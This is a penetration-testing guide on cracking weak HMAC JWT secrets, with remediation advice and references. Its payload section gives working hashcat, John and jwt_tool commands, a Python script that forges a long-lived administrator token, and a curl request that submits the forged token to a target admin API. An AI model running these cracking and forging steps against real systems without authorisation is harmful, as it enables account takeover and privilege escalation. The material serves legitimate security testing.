# JWT Weak Secret / Brute-forceable

## Overview
JWTs using the HMAC-SHA256 (HS256), HS384, or HS512 algorithms are signed with a symmetric secret key — the same key signs and verifies. If this secret is weak, short, or guessable (e.g., `secret`, `password`, `jwt_secret`, the application name), an attacker who obtains a signed JWT can offline-brute-force the secret. Once the secret is known, the attacker can forge arbitrary tokens, impersonating any user or elevating privileges.

## How It Works
- An attacker captures a valid HS256 JWT from the application.
- The JWT signature is `HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)`.
- Since HMAC-SHA256 is fast, an attacker can test millions of candidate secrets per second using GPU acceleration.
- Common weak secrets include: `secret`, `password`, `123456`, the application name, environment name, default framework values (e.g., Django's `django-insecure-...` prefix), and hardcoded development secrets left in production.
- Secrets found in GitHub repositories, `.env` files, Docker images, or configuration files allow immediate forgery without brute force.

## Impact
- Forge JWT tokens for any user identity, including administrators.
- Modify any claim in the payload: user ID, role, email, permissions, account type.
- Session persistence — create non-expiring tokens that bypass session timeout.
- Pivot to other services that trust the same JWT secret.

## Where to Look
- `Authorization: Bearer <JWT>` headers in authenticated requests.
- Cookies named `token`, `jwt`, `access_token`, `auth`.
- API response bodies that include JWT tokens.
- GitHub/GitLab source code for hardcoded JWT secrets in config files or `.env` examples.
- Docker images (`docker inspect`, `docker history`) for environment variables containing the secret.
- CI/CD pipeline environment variables (accidentally committed pipelines or build logs).
- JavaScript bundles (`main.js`, `vendor.js`) where secrets may be embedded.

## Testing Steps
1. Capture a JWT from the application and confirm it uses HS256/HS384/HS512 by decoding the header.
2. Run `hashcat` or `john` against the token with a common password wordlist.
3. Run `jwt_tool` automated weak secret detection against the token.
4. Search the application's GitHub repositories for the JWT secret variable name.
5. If the application is open source or has leaked source, search for `JWT_SECRET`, `SECRET_KEY`, `jwt.secret`, `jwtSecret`.
6. Test common default secrets manually: `secret`, `password`, `123456`, the app name, `changeme`, `development`.
7. If the secret is found, forge a new JWT with modified claims (role: admin, user_id: 1) and submit it.
8. Verify the forged token is accepted by making an authenticated API call.

## Payloads / Techniques

Hashcat JWT brute force (fastest method):
```bash
# Extract just the token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.SIGNATURE"

# Brute force with rockyou wordlist (mode 16500 = JWT)
hashcat -a 0 -m 16500 "$TOKEN" /usr/share/wordlists/rockyou.txt

# With rules for coverage
hashcat -a 0 -m 16500 "$TOKEN" /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force short secrets (up to 6 chars)
hashcat -a 3 -m 16500 "$TOKEN" ?a?a?a?a?a?a
```

John the Ripper JWT cracking:
```bash
# Save token to file
echo "$TOKEN" > jwt.txt

# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# Show cracked secret
john --show jwt.txt
```

jwt_tool automated testing:
```bash
# Install: pip3 install jwt_tool
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/common_secrets.txt

# Tamper mode - modify claims after cracking
python3 jwt_tool.py $TOKEN -T -S hs256 -p "found_secret"

# Forge new token with known secret
python3 jwt_tool.py -I -S hs256 -pc role -pv administrator -p "found_secret"
```

Manual forging with PyJWT after finding secret:
```python
import jwt
import datetime

FOUND_SECRET = "secret"  # or whatever was cracked

# Forge admin token
payload = {
    "sub": "1",
    "user": "admin",
    "email": "admin@target.com",
    "role": "administrator",
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(days=365)).timestamp())
}

forged_token = jwt.encode(payload, FOUND_SECRET, algorithm="HS256")
print(f"Forged token: {forged_token}")
```

Test forged token:
```bash
curl -H "Authorization: Bearer FORGED_TOKEN" \
  https://target.com/api/admin/users \
  | python3 -m json.tool
```

Search GitHub for exposed secrets:
```bash
# GitHub search (manual via browser/API)
# site:github.com "JWT_SECRET" "target.com"
# site:github.com "jwt.secret" filename:.env
# Use truffleHog or gitleaks for automated scanning
trufflehog github --org=targetorganization --only-verified
gitleaks detect --source /path/to/cloned/repo --report-format json
```

## Burp Suite Tips
- Install the **JWT Editor** extension — after testing a JWT in Repeater, click the "JWT Editor" tab, select "Brute Force Secret" and supply a wordlist.
- The extension also allows **manual claim editing** and re-signing with a known secret directly in the Repeater interface.
- Use **Intruder** (Sniper) with a common secrets wordlist as payloads targeting the full JWT token — craft a payload generator that signs each candidate secret and checks the result (requires custom Python extension).
- In **Proxy**, right-click the Authorization header and send it to the JWT Editor for analysis.
- Use **Collaborator Everywhere** passively — if the JWT is somehow involved in server-side requests, Collaborator will catch leaked tokens.
- The **Hackvertor** extension can help with custom base64url encoding during manual JWT crafting.

## Tools
- **hashcat** — GPU-accelerated JWT cracking (mode 16500); fastest available option.
- **john the ripper** — CPU-based JWT secret cracking.
- **jwt_tool** — Full-featured JWT testing toolkit: cracking, forging, scanning.
- **jwt.io** — Online decoder for manual inspection.
- **truffleHog** — Searches git history for secrets including JWT signing keys.
- **gitleaks** — Repository secret scanning for exposed JWT secrets.
- **JWT Editor (Burp)** — Integrated cracking and forging in Burp Suite.

## Remediation
- Use a cryptographically random JWT secret of at least 256 bits (32 bytes): `openssl rand -hex 32`.
- Never use dictionary words, application names, or predictable strings as JWT secrets.
- Store JWT secrets in a secrets manager (AWS Secrets Manager, HashiCorp Vault) — never in source code, `.env` files committed to version control, or Docker build args.
- Rotate JWT secrets regularly; implement a rotation strategy that honors existing tokens during the transition window.
- Consider switching from symmetric (HS256) to asymmetric (RS256 or ES256) signing — the private key never needs to leave the signing service, and a leaked public key cannot be used to forge tokens.
- Scan all repositories for accidentally committed secrets using automated tools on every push.
- Set short JWT expiry times (`exp` claim) to limit the exploitation window if a secret is compromised.

## References
https://portswigger.net/web-security/jwt
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
https://hashcat.net/wiki/doku.php?id=hashcat
https://github.com/ticarpi/jwt_tool
https://cwe.mitre.org/data/definitions/327.html
